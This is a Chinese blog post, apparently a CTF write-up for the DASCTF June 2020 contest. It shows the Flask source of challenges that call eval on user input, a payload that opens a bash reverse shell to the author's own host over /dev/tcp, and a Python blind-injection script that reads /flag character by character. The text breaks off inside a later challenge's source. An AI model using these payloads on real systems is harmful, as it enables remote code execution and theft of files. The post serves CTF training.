@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="YzoIkNCtgkWfYMQovJhcU7aeRpuXehkNNh0zBBrgobQ">
+  <meta name="msvalidate.01" content="E4EE6E9D43DD4FD9A783824561BFF9EA">
+  <meta name="yandex-verification" content="6ba71dc679153571">
+  <meta name="baidu-site-verification" content="1MHVnbH1GX">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/themes/blue/pace-theme-minimal.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.jeffz.cn","root":"/","scheme":"Muse","version":"7.8.0","exturl":true,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="DASCTF2020六月团队赛的Web和Misc的部分writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020_DASCTF_六月部分wp">
+<meta property="og:url" content="https://blog.jeffz.cn/2020/06/26/2020-6-DASCTF-%E9%83%A8%E5%88%86/index.html">
+<meta property="og:site_name" content="Jeff&#39;s Blog">
+<meta property="og:description" content="DASCTF2020六月团队赛的Web和Misc的部分writeup">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/06/27/yH9n1gXV8WAx36Y.png">
+<meta property="og:image" content="https://i.loli.net/2020/06/27/SGni8retFOC9IE1.png">
+<meta property="og:image" content="https://i.loli.net/2020/06/27/4XuMlF35LJWdDk9.png">
+<meta property="og:image" content="https://i.loli.net/2020/06/27/UFZARXQBE9N3S2k.png">
+<meta property="og:image" content="https://i.loli.net/2020/06/27/zNAvgeHB48jEIih.png">
+<meta property="article:published_time" content="2020-06-26T14:54:47.000Z">
+<meta property="article:modified_time" content="2020-06-26T17:50:44.118Z">
+<meta property="article:author" content="Jeff">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="DASCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/06/27/yH9n1gXV8WAx36Y.png">
+
+<link rel="canonical" href="https://blog.jeffz.cn/2020/06/26/2020-6-DASCTF-%E9%83%A8%E5%88%86/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2020_DASCTF_六月部分wp | Jeff's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?189b39b025c3006eae93f92c369aa731";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Jeff's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>我</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-collect">
+
+    <a href="/collect/" rel="section"><i class="fa fa-address-book fa-fw"></i>网站收集</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL2plZmZ6NjE1" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.jeffz.cn/2020/06/26/2020-6-DASCTF-%E9%83%A8%E5%88%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Jeff">
+      <meta itemprop="description" content="一个菜狗的辣鸡博客。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jeff's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2020_DASCTF_六月部分wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-06-26 22:54:47" itemprop="dateCreated datePublished" datetime="2020-06-26T22:54:47+08:00">2020-06-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-06-27 01:50:44" itemprop="dateModified" datetime="2020-06-27T01:50:44+08:00">2020-06-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">DASCTF2020六月团队赛的Web和Misc的部分writeup</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>web随便水了几道题</p>
+<h3 id="简单的计算题1"><a href="#简单的计算题1" class="headerlink" title="简单的计算题1"></a>简单的计算题1</h3><p>一开始的源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request,session</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> create</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## flag is in /flag try to get it</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(string)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"or"</span> <span class="keyword">in</span> string:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"hack"</span></span><br><span class="line">        <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        input = request.form[<span class="string">'input'</span>]</span><br><span class="line">        create_question = create()</span><br><span class="line">        input_question = session.get(<span class="string">'question'</span>)</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">if</span> input_question==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"Invalid session please try again!"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">if</span> filter(input)==<span class="string">"hack"</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"hack"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            calc_result = str((eval(input_question + <span class="string">"="</span> + str(input))))</span><br><span class="line">            <span class="keyword">if</span> calc_result == <span class="string">'True'</span>:</span><br><span class="line">                result = <span class="string">"Congratulations"</span></span><br><span class="line">            <span class="keyword">elif</span> calc_result == <span class="string">'False'</span>:</span><br><span class="line">                result = <span class="string">"Error"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=result,question=create_question)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        create_question = create()</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,question=create_question)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/source')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">"app.py"</span>, <span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>只过滤了<code>or</code>，这可操作性就大了</p>
+<p>回显只能判断结果<code>True</code>还是<code>False</code>亦或者报错</p>
+<p>这种时候有两种思路，一是反弹shell，二是盲注</p>
+<ul>
+<li><p>反弹shell</p>
+<p>经过简单的测试，<code>open().write()</code>和<code>os.system()</code>可以用，所以直接填上这个提交</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,open(&#39;&#x2F;tmp&#x2F;c.sh&#39;,&#39;w&#39;).write(&#39;&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;jeffz.cn&#x2F;6009 0&gt;&amp;1&#39;),os.system(&#39;&#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;c.sh&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>然后本地nc监听就能拿到shell</p>
+</li>
+</ul>
+<p>然后后面修复了可以反弹shell的bug，但是我们还是可以命令盲注</p>
+<p>修复后的源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request,session</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> black_list,create</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## flag is in /flag try to get it</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(string)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> black_word <span class="keyword">in</span> black_list:</span><br><span class="line">            <span class="keyword">if</span> black_word <span class="keyword">in</span> string:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"hack"</span></span><br><span class="line">        <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        input = request.form[<span class="string">'input'</span>]</span><br><span class="line">        create_question = create()</span><br><span class="line">        input_question = session.get(<span class="string">'question'</span>)</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">if</span> input_question==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"Invalid session please try again!"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">if</span> filter(input)==<span class="string">"hack"</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"hack"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            calc_result = str((eval(input_question + <span class="string">"="</span> + str(input))))</span><br><span class="line">            <span class="keyword">if</span> calc_result == <span class="string">'True'</span>:</span><br><span class="line">                result = <span class="string">"Congratulations"</span></span><br><span class="line">            <span class="keyword">elif</span> calc_result == <span class="string">'False'</span>:</span><br><span class="line">                result = <span class="string">"Error"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=result,question=create_question)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        create_question = create()</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,question=create_question)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/source')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">"app.py"</span>, <span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>盲注</p>
+<p>经过简单的测试，发现<code>open().read()</code>没有被ban，所以可以利用这个来盲注</p>
+<p>以下是最主要的payload，然后再写个脚本自动答题就行了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">f" and bool(open('/flag').read()[<span class="subst">&#123;x&#125;</span>]&gt;chr(<span class="subst">&#123;mid&#125;</span>))"</span></span><br></pre></td></tr></table></figure>
+
+<p><code>exp</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">"http://183.129.189.60:10026/"</span></span><br><span class="line">sess = requests.session()</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">x=<span class="number">-1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    x += <span class="number">1</span></span><br><span class="line">    low = <span class="number">8</span></span><br><span class="line">    high = <span class="number">130</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = <span class="string">f" and bool(open('/flag').read()[<span class="subst">&#123;x&#125;</span>]&gt;chr(<span class="subst">&#123;mid&#125;</span>))"</span></span><br><span class="line">            r = sess.get(url)</span><br><span class="line">            html = r.text</span><br><span class="line">            calc = re.findall(<span class="string">r'h4&gt;(.+?)=&lt;/h4'</span>,html)</span><br><span class="line">            result = str(eval(calc[<span class="number">0</span>]))</span><br><span class="line">            inp = result + payload</span><br><span class="line">            r = sess.post(url,data=&#123;<span class="string">"input"</span>:inp&#125;)</span><br><span class="line">            html = r.text</span><br><span class="line">            result = re.findall(<span class="string">r'h3&gt;(.+?)&lt;/h3'</span>,html)</span><br><span class="line">            print(result[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">0</span>]==<span class="string">'Congratulations'</span>:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#print(mid)</span></span><br><span class="line">    flag += chr(int(mid))</span><br><span class="line">    print(flag)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(flag)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>DASCTF{53a6ee70a3e8c013e2b1dbb2b926d3b2}</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="简单的计算题2"><a href="#简单的计算题2" class="headerlink" title="简单的计算题2"></a>简单的计算题2</h3><p>源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request,session</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> black_list,create</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## flag is in /flag try to get it</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(string)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> black_word <span class="keyword">in</span> black_list:</span><br><span class="line">            <span class="keyword">if</span> black_word <span class="keyword">in</span> string:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"hack"</span></span><br><span class="line">        <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        input = request.form[<span class="string">'input'</span>]</span><br><span class="line">        create_question = create()</span><br><span class="line">        input_question = session.get(<span class="string">'question'</span>)</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">if</span> input_question == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"Invalid session please try again!"</span>, question=create_question)</span><br><span class="line">        <span class="keyword">if</span> filter(input)==<span class="string">"hack"</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=<span class="string">"hack"</span>, question=create_question)</span><br><span class="line">        calc_str = input_question + <span class="string">"="</span> + str(input)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            calc_result = str((eval(calc_str)))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">            calc_result = <span class="string">"Invalid"</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, answer=calc_result,question=create_question)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        create_question = create()</span><br><span class="line">        session[<span class="string">'question'</span>] = create_question</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,question=create_question)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/source')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">"app.py"</span>, <span class="string">"r"</span>).read()</span><br><span 